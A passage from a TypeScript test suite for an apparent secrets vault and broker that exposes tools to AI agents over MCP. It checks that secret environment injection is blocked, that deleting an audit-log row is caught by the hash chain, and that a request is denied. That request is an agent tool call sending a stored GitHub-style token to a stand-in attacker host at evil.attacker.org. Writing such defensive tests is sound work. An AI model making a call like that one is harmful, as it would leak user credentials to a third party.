        PolicyViolationError
      );
    } finally {
      vault.close();
    }
  });

  test('20. Subprocess allowEnvInjection=false permits CLI arg placeholders while blocking secretEnv injection', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'arg-only-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'cli/arg_only',
      value: 'arg_secret_8877665544',
      policy: {
        allowedTools: ['exec'],
        allowedCommands: ['node'],
        allowEnvInjection: false,
      },
    });
    const broker = new PasswordOneBroker(vault);
    try {
      await assert.rejects(
        broker.executeCommand({
          command: process.execPath,
          args: ['-v'],
          secretEnv: { MY_ENV: 'pw1://cli/arg_only' },
        }),
        PolicyViolationError
      );

      const okRes = await broker.executeCommand({
        command: process.execPath,
        args: ['-e', 'process.stdout.write("arg_len=" + process.argv[1].length)', '{{pw1://cli/arg_only}}'],
      });
      assert.equal(okRes.exitCode, 0);
      assert.equal(okRes.stdout, 'arg_len=21');
    } finally {
      vault.close();
    }
  });

  test('21. Audit chain detects row deletion (sequence & prev_hash link break)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'pw1-audit-gap-'));
    const dbPath = join(dir, 'gap.sqlite');
    try {
      const vault = new PasswordOneVault({ dbPath, masterKey: 'audit-gap-key-2026', scryptN: 1024 });
      vault.appendAudit({ action: 'E1', decision: 'ALLOW', reason: 'First' });
      vault.appendAudit({ action: 'E2', decision: 'ALLOW', reason: 'Second' });
      vault.appendAudit({ action: 'E3', decision: 'ALLOW', reason: 'Third' });
      assert.equal(vault.verifyAuditChain().valid, true);

      const raw = new DatabaseSync(dbPath);
      raw.prepare('DELETE FROM audit_logs WHERE seq = 2').run();
      raw.close();

      const verify = vault.verifyAuditChain();
      assert.equal(verify.valid, false);
      assert.equal(verify.brokenAtSeq, 3);
      vault.close();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('22. MCP pw1_http_request SSRF denial and pw1_audit_verify work end-to-end', async () => {
    const vault = new PasswordOneVault({ dbPath: ':memory:', masterKey: 'mcp-ssrf-key', scryptN: 1024 });
    vault.upsertSecret({
      alias: 'gh/token',
      value: 'ghp_McpSsrfProtectedToken1122334455',
      policy: { allowedHosts: ['api.github.com'], allowedTools: ['http'] },
    });
    const broker = new PasswordOneBroker(vault);
    const dispatcher = new PasswordOneMcpDispatcher(vault, broker);
    try {
      const denyRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 10,
        method: 'tools/call',
        params: {
          name: 'pw1_http_request',
          arguments: {
            url: 'https://evil.attacker.org/collect',
            auth: { type: 'bearer', secret: 'pw1://gh/token' },
          },
        },
      });
      assert.equal((denyRes?.result as any).isError, true);

      const auditRes = await dispatcher.handleMessage({
        jsonrpc: '2.0',
        id: 11,
        method: 'tools/call',
        params: {
          name: 'pw1_audit_verify',
          arguments: { limit: 5 },
        },
      });
      const auditData = JSON.parse(String((auditRes?.result as any).content[0].text));
      assert.equal(auditData.verification.valid, true);
      assert.equal(auditData.entries[0].action, 'HTTP_DENY');
    } finally {
      vault.close();
    }
  });
});
